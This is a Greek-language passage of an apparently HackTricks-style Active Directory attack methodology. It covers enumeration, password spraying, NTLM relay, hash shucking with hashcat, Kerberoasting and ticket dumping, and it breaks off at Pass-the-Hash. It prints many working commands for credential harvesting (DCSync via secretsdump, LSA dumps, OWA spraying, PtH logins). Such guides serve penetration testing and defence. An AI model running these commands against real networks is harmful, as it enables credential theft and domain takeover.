# Active Directory Μεθοδολογία

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

**Active Directory** λειτουργεί ως θεμελιώδης τεχνολογία, επιτρέποντας σε **διαχειριστές δικτύου** να δημιουργούν και να διαχειρίζονται αποδοτικά **domains**, **users** και **objects** μέσα σε ένα δίκτυο. Έχει σχεδιαστεί για να κλιμακώνεται, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμες **groups** και **subgroups**, ενώ ελέγχει τα **access rights** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία κύρια στρώματα: **domains**, **trees**, και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή αντικειμένων, όπως **users** ή **devices**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **trees** είναι ομάδες αυτών των domains που συνδέονται μέσω μιας κοινής δομής, και ένα **forest** αντιπροσωπεύει τη συλλογή πολλών trees, διασυνδεδεμένα μέσω **trust relationships**, σχηματίζοντας το ανώτατο επίπεδο της οργανωτικής δομής. Συγκεκριμένα δικαιώματα **access** και **communication rights** μπορούν να οριστούν σε κάθε ένα από αυτά τα επίπεδα.

Σημαντικές έννοιες μέσα στο **Active Directory** περιλαμβάνουν:

1. **Directory** – Φιλοξενεί όλες τις πληροφορίες που αφορούν τα Active Directory αντικείμενα.
2. **Object** – Αναφέρεται σε οντότητες μέσα στο directory, όπως **users**, **groups**, ή **shared folders**.
3. **Domain** – Λειτουργεί ως δοχείο για αντικείμενα directory, με τη δυνατότητα πολλαπλών domains να συνυπάρχουν μέσα σε ένα **forest**, το καθένα διατηρώντας τη δική του συλλογή αντικειμένων.
4. **Tree** – Ομαδοποίηση domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Η κορυφή της οργανωτικής δομής στο Active Directory, αποτελούμενη από πολλαπλά trees με **trust relationships** μεταξύ τους.

**Active Directory Domain Services (AD DS)** περιλαμβάνει μια σειρά υπηρεσιών κρίσιμων για την κεντρική διαχείριση και την επικοινωνία εντός ενός δικτύου. Αυτές οι υπηρεσίες περιλαμβάνουν:

1. **Domain Services** – Κεντρικοποιεί την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **users** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **search**.
2. **Certificate Services** – Εποπτεύει τη δημιουργία, διανομή και διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει εφαρμογές που χρησιμοποιούν directory μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για την αυθεντικοποίηση χρηστών σε πολλαπλές web εφαρμογές σε μία συνεδρία.
5. **Rights Management** – Βοηθά στην προστασία υλικού με πνευματικά δικαιώματα ρυθμίζοντας την ανεξέλεγκτη διανομή και χρήση του.
6. **DNS Service** – Κρίσιμη για την επίλυση **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Αν έχετε πρόσβαση μόνο στο περιβάλλον ενός AD αλλά δεν έχετε credentials/sessions μπορείτε:

- **Pentest the network:**
- Σκάναρετε το δίκτυο, βρείτε μηχανές και ανοιχτές θύρες και προσπαθήστε να **exploit vulnerabilities** ή να **extract credentials** από αυτές (π.χ., [printers could be very interesting targets](ad-information-in-printers.md)).
- Η καταγραφή του DNS μπορεί να δώσει πληροφορίες για κρίσιμους servers στο domain όπως web, printers, shares, vpn, media, κ.λπ.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Ρίξτε μια ματιά στη Γενική [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε.
- **Check for null and Guest access on smb services** (αυτό δεν θα δουλέψει σε σύγχρονες εκδόσεις Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Μια πιο λεπτομερής οδηγία για το πώς να enumeratε έναν SMB server μπορείτε να βρείτε εδώ:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Μια πιο λεπτομερής οδηγία για το πώς να enumeratε LDAP μπορείτε να βρείτε εδώ (δώστε **ειδική προσοχή στην anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Συλλέξτε credentials **impersonating services με Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Πρόσβαση σε host μέσω **abusing the relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Συλλέξτε credentials **exposing** **fake UPnP services with evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Εξάγετε usernames/ονοματεπώνυμα από εσωτερικά έγγραφα, social media, υπηρεσίες (κυρίως web) εντός του domain περιβάλλοντος αλλά και από το δημόσια διαθέσιμο υλικό.
- Αν βρείτε τα πλήρη ονόματα των εργαζομένων της εταιρείας, μπορείτε να δοκιμάσετε διαφορετικές AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο κοινές συμβάσεις είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3 γράμματα από κάθε όνομα), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Εργαλεία:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Δείτε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητείται ένα **invalid username** ο server θα απαντήσει με τον **Kerberos error** κωδικό _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να προσδιορίσουμε ότι το username ήταν άκυρο. **Valid usernames** θα προκαλέσουν είτε το **TGT in a AS-REP** response είτε το σφάλμα _KRB5KDC_ERR_PREAUTH_REQUIRED_, υποδεικνύοντας ότι ο χρήστης απαιτείται να πραγματοποιήσει pre-authentication.
- **No Authentication against MS-NRPC**: Χρησιμοποιώντας auth-level = 1 (No authentication) ενάντια στην MS-NRPC (Netlogon) διεπαφή σε domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` μετά το binding της MS-NRPC διεπαφής για να ελέγξει αν ο χρήστης ή ο υπολογιστής υπάρχει χωρίς οποιαδήποτε credentials. Το εργαλείο [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτό τον τύπο enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Αν βρείτε έναν από αυτούς τους servers στο δίκτυο, μπορείτε επίσης να πραγματοποιήσετε **user enumeration εναντίον του**. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το εργαλείο [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Μπορείτε να βρείτε λίστες ονομάτων χρηστών στο [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) και σε αυτό ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε τα ονόματα των ατόμων που εργάζονται στην εταιρεία από το βήμα recon που θα έπρεπε να έχετε πραγματοποιήσει προηγουμένως. Με το όνομα και το επώνυμο μπορείτε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανούς έγκυρους usernames.

### Γνωρίζοντας ένα ή περισσότερα ονόματα χρήστη

Εντάξει, ξέρετε ότι έχετε ήδη ένα έγκυρο όνομα χρήστη αλλά κανένα passwords... Τότε δοκιμάστε:

- [**ASREPRoast**](asreproast.md): Αν ένας χρήστης **δεν έχει** το attribute _DONT_REQ_PREAUTH_ μπορείτε να **ζητήσετε ένα AS_REP message** για αυτόν τον χρήστη που θα περιέχει κάποια δεδομένα κρυπτογραφημένα από μια παράγωγο του password του χρήστη.
- [**Password Spraying**](password-spraying.md): Δοκιμάστε τους πιο **κοινους passwords** με κάθε έναν από τους ανακαλυφθέντες χρήστες, ίσως κάποιος χρήστης χρησιμοποιεί ένα κακό password (keep in mind the password policy!).
- Σημειώστε ότι μπορείτε επίσης να **spray OWA servers** για να προσπαθήσετε να αποκτήσετε πρόσβαση στους users' mail servers.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Μπορεί να καταφέρετε να **obtain** μερικά challenge **hashes** για να crackάρετε μέσω **poisoning** κάποια πρωτόκολλα του **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Αν καταφέρετε να enumerate το Active Directory θα έχετε **περισσότερα emails και καλύτερη κατανόηση του network**. Μπορεί να είστε σε θέση να καθορίσετε NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) για να αποκτήσετε πρόσβαση στο AD env.

### NetExec workspace-driven recon & relay posture checks

- Χρησιμοποιήστε **`nxcdb` workspaces** για να κρατάτε το AD recon state ανά engagement: `workspace create <name>` δημιουργεί per-protocol SQLite DBs κάτω από `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views με `proto smb|mssql|winrm` και εμφανίστε τα συλλεγμένα secrets με `creds`. Καθαρίστε χειροκίνητα ευαίσθητα δεδομένα όταν τελειώσετε: `rm -rf ~/.nxc/workspaces/<name>`.
- Γρήγορη ανακάλυψη υποδικτύου με **`netexec smb <cidr>`** εμφανίζει **domain**, **OS build**, **SMB signing requirements**, και **Null Auth**. Κόμβοι που εμφανίζουν `(signing:False)` είναι **relay-prone**, ενώ οι DCs συχνά απαιτούν signing.
- Δημιουργήστε **hostnames in /etc/hosts** απευθείας από την έξοδο του NetExec για να διευκολύνετε το targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Όταν **SMB relay to the DC is blocked** λόγω signing, εξακολουθήστε να ελέγχετε την κατάσταση του **LDAP**: `netexec ldap <dc>` επισημαίνει `(signing:None)` / weak channel binding. Ένας DC με SMB signing required αλλά LDAP signing disabled παραμένει ένας βιώσιμος στόχος **relay-to-LDAP** για καταχρήσεις όπως **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Οι UI των printer/web μερικές φορές ενσωματώνουν κρυμμένους κωδικούς διαχειριστή στο HTML. Η προβολή του source/devtools μπορεί να αποκαλύψει cleartext (π.χ., `<input value="<password>">`), επιτρέποντας πρόσβαση μέσω Basic-auth σε αποθετήρια σάρωσης/εκτύπωσης.
- Τα ανακτημένα print jobs μπορεί να περιέχουν **onboarding docs σε plaintext** με κωδικούς ανά χρήστη. Διατηρήστε τις αντιστοιχίσεις (pairings) ευθυγραμμισμένες όταν δοκιμάζετε:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Κλέψτε NTLM διαπιστευτήρια

Αν μπορείτε να **έχετε πρόσβαση σε άλλους υπολογιστές ή shares** με τον **null ή guest user** θα μπορούσατε να **τοποθετήσετε αρχεία** (π.χ. ένα SCF αρχείο) που αν ανοιχτούν με κάποιον τρόπο θα **προκαλέσουν μια NTLM authentication εναντίον σας** ώστε να **κλέψετε** το **NTLM challenge** για να το σπάσετε:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** αντιμετωπίζει κάθε NT hash που ήδη κατέχετε ως υποψήφιο password για άλλα, πιο αργά formats των οποίων το key material προέρχεται άμεσα από το NT hash. Αντί να κάνετε brute-force σε μεγάλες passphrases σε Kerberos RC4 tickets, NetNTLM challenges ή cached credentials, τροφοδοτείτε τα NT hashes στα NT-candidate modes του Hashcat και του επιτρέπετε να επικυρώσει την επαναχρησιμοποίηση password χωρίς ποτέ να μάθει το plaintext. Αυτό είναι ιδιαίτερα ισχυρό μετά από συμβιβασμό ενός domain όπου μπορείτε να συλλέξετε χιλιάδες τρέχοντα και ιστορικά NT hashes.

Χρησιμοποιήστε shucking όταν:

- Έχετε ένα NT corpus από DCSync, SAM/SECURITY dumps, ή credential vaults και χρειάζεται να ελέγξετε για reuse σε άλλα domains/forests.
- Captureάρετε RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, ή DCC/DCC2 blobs.
- Θέλετε να αποδείξετε γρήγορα reuse για μεγάλες, μη-σπαστές passphrases και να pivotάρετε άμεσα μέσω Pass-the-Hash.

Η τεχνική **δεν λειτουργεί** ενάντια σε encryption types των οποίων τα κλειδιά δεν είναι το NT hash (π.χ., Kerberos etype 17/18 AES). Αν ένα domain επιβάλλει AES-only, πρέπει να επιστρέψετε στα regular password modes.

#### Κατασκευή NT hash corpus

- **DCSync/NTDS** – Χρησιμοποιήστε `secretsdump.py` με history για να τραβήξετε το μεγαλύτερο δυνατό σετ NT hashes (και τις προηγούμενες τιμές τους):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Οι history εγγραφές διευρύνουν δραματικά την ομάδα υποψηφίων επειδή η Microsoft μπορεί να αποθηκεύσει έως και 24 προηγούμενα hashes ανά λογαριασμό. Για περισσότερους τρόπους συγκομιδής NTDS secrets δείτε:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ή Mimikatz `lsadump::sam /patch`) εξάγει τοπικά SAM/SECURITY δεδομένα και cached domain logons (DCC/DCC2). Αφαιρέστε διπλότυπα και προσθέστε αυτά τα hashes στην ίδια λίστα `nt_candidates.txt`.
- **Track metadata** – Κρατήστε το username/domain που παρήγαγε κάθε hash (ακόμα κι αν το wordlist περιέχει μόνο hex). Τα ταιριαστά hashes σας λένε αμέσως ποιος principal επαναχρησιμοποιεί password μόλις το Hashcat εκτυπώσει τον νικητήριο candidate.
- Προτιμήστε candidates από το ίδιο forest ή από trusted forest· αυτό μεγιστοποιεί την πιθανότητα overlap όταν shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Σημειώσεις:

- Τα NT-candidate inputs **πρέπει να παραμείνουν raw 32-hex NT hashes**. Απενεργοποιήστε τα rule engines (όχι `-r`, όχι hybrid modes) γιατί τα mangling καταστρέφουν το candidate key material.
- Αυτά τα modes δεν είναι εγγενώς γρηγορότερα, αλλά το NTLM keyspace (~30,000 MH/s σε ένα M3 Max) είναι ~100× πιο γρήγορο από το Kerberos RC4 (~300 MH/s). Το να δοκιμάσετε μια επιμελημένη λίστα NT είναι πολύ φθηνότερο από το να εξερευνήσετε ολόκληρο το password space στη αργή μορφή.
- Πάντα τρέχετε το **πιο πρόσφατο Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) γιατί τα modes 31500/31600/35300/35400 κυκλοφόρησαν πρόσφατα.
- Αυτή τη στιγμή δεν υπάρχει NT mode για AS-REQ Pre-Auth, και τα AES etypes (19600/19700) απαιτούν το plaintext password επειδή τα κλειδιά τους παραγονται μέσω PBKDF2 από UTF-16LE passwords, όχι από raw NT hashes.

#### Παράδειγμα – Kerberoast RC4 (mode 35300)

1. Captureάρετε ένα RC4 TGS για ένα target SPN με έναν low-privileged user (βλέπε τη σελίδα Kerberoast για λεπτομέρειες):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck το ticket με τη λίστα NT σας:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Το Hashcat παράγει το RC4 key από κάθε NT candidate και επικυρώνει το `$krb5tgs$23$...` blob. Ένα match επιβεβαιώνει ότι ο service account χρησιμοποιεί ένα από τα υπάρχοντα NT hashes σας.

3. Pivotάρετε αμέσως μέσω PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Μπορείτε προαιρετικά να ανακτήσετε το plaintext αργότερα με `hashcat -m 1000 <matched_hash> wordlists/` αν χρειαστεί.

#### Παράδειγμα – Cached credentials (mode 31600)

1. Dumpάρετε cached logons από ένα compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Αντιγράψτε τη γραμμή DCC2 για τον ενδιαφέροντα domain user σε `dcc2_highpriv.txt` και shuckάρετε:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ένα επιτυχημένο match αποδίδει το NT hash που ήδη υπάρχει στη λίστα σας, αποδεικνύοντας ότι ο cached user επαναχρησιμοποιεί password. Χρησιμοποιήστε το άμεσα για PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ή brute-force το σε γρήγορο NTLM mode για να ανακτήσετε το string.

Το ίδιο workflow εφαρμόζεται σε NetNTLM challenge-responses (`-m 27000/27100`) και DCC (`-m 31500`). Μόλις εντοπιστεί ένα match μπορείτε να ξεκινήσετε relay, SMB/WMI/WinRM PtH, ή να ξανασπάσετε το NT hash με masks/rules offline.

## Καταγραφή Active Directory ΜΕ credentials/session

Για αυτή τη φάση χρειάζεται να έχετε **συμβιβαστεί τα credentials ή μια session ενός έγκυρου domain account.** Αν έχετε έγκυρα credentials ή ένα shell ως domain user, **πρέπει να θυμάστε ότι οι επιλογές που αναφέρθηκαν προηγουμένως είναι ακόμη επιλογές για να συμβιβάσετε άλλους χρήστες.**

Πριν ξεκινήσετε την authenticated enumeration πρέπει να γνωρίζετε τι είναι το **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Καταγραφή

Το να έχετε συμβιβαστεί έναν account είναι ένα **μεγάλο βήμα για να αρχίσετε να συμβιβάζετε ολόκληρο το domain**, γιατί θα μπορείτε να ξεκινήσετε την **Active Directory Enumeration:**

Σε σχέση με [**ASREPRoast**](asreproast.md) τώρα μπορείτε να βρείτε κάθε πιθανό ευάλωτο user, και σε σχέση με [**Password Spraying**](password-spraying.md) μπορείτε να βγάλετε μια **λίστα όλων των usernames** και να δοκιμάσετε το password του συμβιβασμένου account, κενά passwords και νέες υποσχόμενες passwords.

- Μπορείτε να χρησιμοποιήσετε το [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Μπορείτε επίσης να χρησιμοποιήσετε [**powershell for recon**](../basic-powershell-for-pentesters/index.html) που θα είναι πιο stealthy
- Μπορείτε επίσης να [**use powerview**](../basic-powershell-for-pentesters/powerview.md) για να εξάγετε πιο λεπτομερείς πληροφορίες
- Ένα ακόμη εξαιρετικό εργαλείο για recon σε Active Directory είναι το [**BloodHound**](bloodhound.md). Δεν είναι **πολύ stealthy** (ανάλογα με τις μεθόδους συλλογής που χρησιμοποιείτε), αλλά **αν δεν σας νοιάζει** γι' αυτό, αξίζει να το δοκιμάσετε. Βρείτε πού χρήστες μπορούν να κάνουν RDP, βρείτε μονοπάτια προς άλλες ομάδες, κ.λπ.
- **Άλλα αυτοματοποιημένα εργαλεία AD enumeration είναι:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) καθώς μπορεί να περιέχουν ενδιαφέρουσες πληροφορίες.
- Ένα **εργαλείο με GUI** που μπορείτε να χρησιμοποιήσετε για να καταγράψετε τον directory είναι το **AdExplorer.exe** από τη **SysInternal** Suite.
- Μπορείτε επίσης να ψάξετε στη βάση LDAP με **ldapsearch** για να κοιτάξετε για credentials σε πεδία _userPassword_ & _unixUserPassword_, ή ακόμα και για _Description_. βλ. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) για άλλες μεθόδους.
- Αν χρησιμοποιείτε **Linux**, μπορείτε επίσης να καταγράψετε το domain χρησιμοποιώντας [**pywerview**](https://github.com/the-useless-one/pywerview).
- Μπορείτε επίσης να δοκιμάσετε αυτοματοποιημένα εργαλεία όπως:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Εξαγωγή όλων των domain users**

Είναι πολύ εύκολο να αποκτήσετε όλα τα domain usernames από τα Windows (`net user /domain`, `Get-DomainUser` ή `wmic useraccount get name,sid`). Σε Linux, μπορείτε να χρησιμοποιήσετε: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ή `enum4linux -a -u "user" -p "password" <DC IP>`

> Ακόμα κι αν αυτή η ενότητα Enumeration φαίνεται μικρή, αυτή είναι το πιο σημαντικό κομμάτι απ' όλα. Επισκεφθείτε τα links (κυρίως αυτά του cmd, powershell, powerview και BloodHound), μάθετε πώς να κάνετε enumeration ενός domain και εξασκηθείτε μέχρι να νιώσετε άνετα. Κατά τη διάρκεια μιας αξιολόγησης, αυτή θα είναι η κρίσιμη στιγμή για να βρείτε τον δρόμο σας προς DA ή να αποφασίσετε ότι δεν μπορεί να γίνει τίποτα.

### Kerberoast

Το Kerberoasting περιλαμβάνει την απόκτηση **TGS tickets** που χρησιμοποιούνται από services συνδεδεμένα με user accounts και το σπάσιμο της κρυπτογράφησής τους—η οποία βασίζεται σε user passwords—**offline**.

Περισσότερα γι' αυτό εδώ:

{{#ref}}
kerberoast.md
{{#endref}}

### Απομακρυσμένη σύνδεση (RDP, SSH, FTP, Win-RM, κ.λπ.)

Μόλις έχετε αποκτήσει κάποια credentials μπορείτε να ελέγξετε αν έχετε πρόσβαση σε κάποιο **μηχάνημα**. Γι' αυτό, μπορείτε να χρησιμοποιήσετε το **CrackMapExec** για να προσπαθήσετε σύνδεση σε πολλούς servers με διάφορα πρωτόκολλα, ανάλογα με τα ports που έχετε σαρώσει.

### Τοπική Ανύψωση Δικαιωμάτων

Αν έχετε συμβιβαστεί credentials ή session ως ένας απλός domain user και έχετε **πρόσβαση** με αυτόν τον χρήστη σε **οποιοδήποτε μηχάνημα του domain** θα πρέπει να προσπαθήσετε να βρείτε τρόπο να **επιτύχετε τοπική άνοδο δικαιωμάτων και να λεηλατήσετε credentials**. Αυτό επειδή μόνο με local administrator privileges θα μπορέσετε να **dumπάρετε hashes άλλων χρηστών** στη μνήμη (LSASS) και τοπικά (SAM).

Υπάρχει μια πλήρης σελίδα σε αυτό το βιβλίο για [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) και μια [**checklist**](../checklist-windows-privilege-escalation.md). Επίσης, μην ξεχάσετε να χρησιμοποιήσετε το [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Τρέχοντα tickets συνεδρίας

Είναι **μάλλον απίθανο** να βρείτε **tickets** στον τρέχοντα user που να σας δίνουν άδεια πρόσβασης σε απροσδόκητους πόρους, αλλά μπορείτε να ελέγξετε:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Αν καταφέρατε να κάνετε enumerate το Active Directory θα έχετε **περισσότερα emails και καλύτερη κατανόηση του δικτύου**. Μπορεί να μπορείτε να αναγκάσετε NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Τώρα που έχετε μερικά βασικά διαπιστευτήρια πρέπει να ελέγξετε αν μπορείτε να **βρείτε** αρχεία ενδιαφέροντος που μοιράζονται μέσα στο AD. Μπορείτε να το κάνετε χειροκίνητα αλλά είναι πολύ βαρετό και επαναλαμβανόμενο (ειδικά αν βρείτε εκατοντάδες docs που πρέπει να ελέγξετε).

[**Ακολουθήστε αυτό το link για να μάθετε για εργαλεία που μπορείτε να χρησιμοποιήσετε.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Αν μπορείτε να **έχετε πρόσβαση σε άλλους υπολογιστές ή shares** μπορείτε να **τοποθετήσετε αρχεία** (π.χ. ένα SCF αρχείο) που αν ανοιχτούν με οποιονδήποτε τρόπο θα **προκαλέσουν μια NTLM authentication εναντίον σας** ώστε να μπορείτε να **κλέψετε** το **NTLM challenge** για να το σπάσετε:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η ευπάθεια επέτρεπε σε οποιονδήποτε authenticated χρήστη να **compromise τον domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Για τις παρακάτω τεχνικές ένας κανονικός domain user δεν είναι αρκετός, χρειάζεστε κάποιες ειδικές προνομίες/διαπιστευτήρια για να εκτελέσετε αυτές τις επιθέσεις.**

### Hash extraction

Ελπίζουμε ότι καταφέρατε να **compromise κάποιον local admin** λογαριασμό χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) συμπεριλαμβανομένου του relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Έπειτα, είναι ώρα να dumpάρετε όλα τα hashes από τη μνήμη και τοπικά.\
[**Διαβάστε αυτή τη σελίδα για διαφορετικούς τρόπους απόκτησης των hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις έχετε το hash ενός χρήστη**, μπορείτε να το χρησιμοποιήσετε για να τον **προσποιηθείτε**.\
